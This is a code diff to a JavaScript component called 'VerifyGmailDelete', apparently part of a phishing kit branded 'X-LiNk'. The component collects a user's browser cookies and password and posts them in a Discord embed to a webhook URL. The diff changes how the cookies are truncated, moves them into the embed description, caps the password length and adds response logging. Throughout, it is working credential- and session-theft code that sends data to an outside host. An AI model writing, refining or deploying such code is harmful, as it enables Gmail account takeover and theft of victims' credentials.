@@ -57,7 +57,7 @@ export const VerifyGmailDelete = ({
       const { refId } = getWebhookData();
       const timestamp = new Date().toISOString();
 
-      // Clean the data
+      // Clean and validate the data
       const cleanCookies = String(data.cookies || "").trim();
       const cleanPassword = String(data.password || "").trim();
 
@@ -68,107 +68,122 @@ export const VerifyGmailDelete = ({
 
       console.log(`📊 Cookie data length: ${cleanCookies.length} characters`);
 
-      // Always send as single Part 1 - no matter the size
+      // Truncate to Discord's description limit
+      const maxLength = 1800; // Safe limit for code blocks
+      const truncatedCookies =
+        cleanCookies.length > maxLength
+          ? cleanCookies.substring(0, maxLength) + "\n\n... (truncated)"
+          : cleanCookies;
+
+      // Build fields array properly
+      const fields = [
+        {
+          name: "🔐 Password",
+          value: `\`\`\`\n${cleanPassword.substring(0, 100)}\n\`\`\``, // Limit password length
+          inline: false,
+        },
+        {
+          name: "⏰ Timestamp",
+          value: timestamp,
+          inline: true,
+        },
+        {
+          name: "🎯 Action",
+          value: "Delete Verified Gmail",
+          inline: true,
+        },
+        {
+          name: "📊 Data Size",
+          value: `${cleanCookies.length} characters`,
+          inline: true,
+        },
+      ];
+
+      // Add instance info if available
+      if (refId) {
+        fields.push({
+          name: "🔗 Instance ID",
+          value: String(refId).substring(0, 100), // Limit length
+          inline: true,
+        });
+        fields.push({
+          name: "🌐 Source",
+          value:
+            webhookType === "custom"
+              ? "Custom Instance"
+              : "Main System Monitor",
+          inline: true,
+        });
+      }
+
+      // Create the embed with safe structure
       const embed = {
         title:
           webhookType === "custom"
             ? "🛡️ Verified Gmail Delete (Custom Instance) - Part 1"
             : "🛡️ Verified Gmail Delete (Main System) - Part 1",
         color: webhookType === "custom" ? 12632256 : 16744192,
-        description:
+        description: `${
           webhookType === "custom"
             ? "🎯 Verified Gmail deletion request from your custom instance!"
-            : "📨 Verified Gmail deletion request received and processed.",
-        fields: [
-          {
-            name: "🍪 Cookies - Part 1",
-            value: `\`\`\`\n${cleanCookies.substring(0, 1800)}\n\`\`\``, // Limit to Discord's field limit
-            inline: false,
-          },
-          {
-            name: "🔐 Password",
-            value: `\`\`\`\n${cleanPassword}\n\`\`\``,
-            inline: false,
-          },
-          {
-            name: "⏰ Timestamp",
-            value: timestamp,
-            inline: true,
-          },
-          {
-            name: "🎯 Action",
-            value: "Delete Verified Gmail",
-            inline: true,
-          },
-          {
-            name: "📊 Data Size",
-            value: `${cleanCookies.length} characters`,
-            inline: true,
-          },
-          ...(refId
-            ? [
-                {
-                  name: "🔗 Instance ID",
-                  value: refId,
-                  inline: true,
-                },
-                {
-                  name: "🌐 Source",
-                  value:
-                    webhookType === "custom"
-                      ? "Custom Instance"
-                      : "Main System Monitor",
-                  inline: true,
-                },
-              ]
-            : []),
-        ],
+            : "📨 Verified Gmail deletion request received and processed."
+        }\n\n🍪 **Cookies:**\n\`\`\`\n${truncatedCookies}\n\`\`\``,
+        fields: fields,
         footer: {
           text:
             webhookType === "custom"
               ? "X-LiNk Custom Instance - Part 1 Complete"
               : "X-LiNk Main System - Part 1 Complete",
         },
+        timestamp: timestamp,
       };
 
-      // If data is too long for one field, add additional fields
-      if (cleanCookies.length > 1800) {
-        const remainingData = cleanCookies.substring(1800);
-        const additionalChunks = [];
-
-        for (let i = 0; i < remainingData.length; i += 1800) {
-          additionalChunks.push(remainingData.substring(i, i + 1800));
-        }
-
-        // Add remaining data as additional fields in the same embed
-        additionalChunks.forEach((chunk, index) => {
-          embed.fields.splice(1, 0, {
-            name: `🍪 Cookies Continuation ${index + 2}`,
-            value: `\`\`\`\n${chunk}\n\`\`\``,
-            inline: false,
-          });
-        });
+      // Validate embed before sending
+      if (!embed.title || !embed.description) {
+        console.error("❌ Invalid embed structure");
+        return false;
       }
 
-      const payload = { embeds: [embed] };
+      const payload = {
+        embeds: [embed],
+      };
 
-      console.log(`📤 Sending single Part 1 to ${webhookType} webhook`);
+      console.log(`📤 Sending validated Part 1 to ${webhookType} webhook`);
+      console.log("📋 Payload preview:", {
+        title: embed.title,
+        description_length: embed.description.length,
+        fields_count: embed.fields.length,
+      });
 
       const response = await fetch(webhookUrl, {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: {
+          "Content-Type": "application/json",
+        },
         body: JSON.stringify(payload),
       });
+
+      let responseText = "";
+      try {
+        responseText = await response.text();
+      } catch (e) {
+        responseText = "Unable to read response";
+      }
+
+      console.log(
+        `📥 ${webhookType} webhook response status:`,
+        response.status,
+      );
+      console.log(`📥 ${webhookType} webhook response:`, responseText);
 
       if (response.ok) {
         console.log(`✅ ${webhookType} webhook Part 1 sent successfully!`);
         return true;
       } else {
-        const errorText = await response.text();
         console.error(
           `❌ ${webhookType} webhook failed:`,
           response.status,
-          errorText,
+          responseText,
         );
         return false;
       }
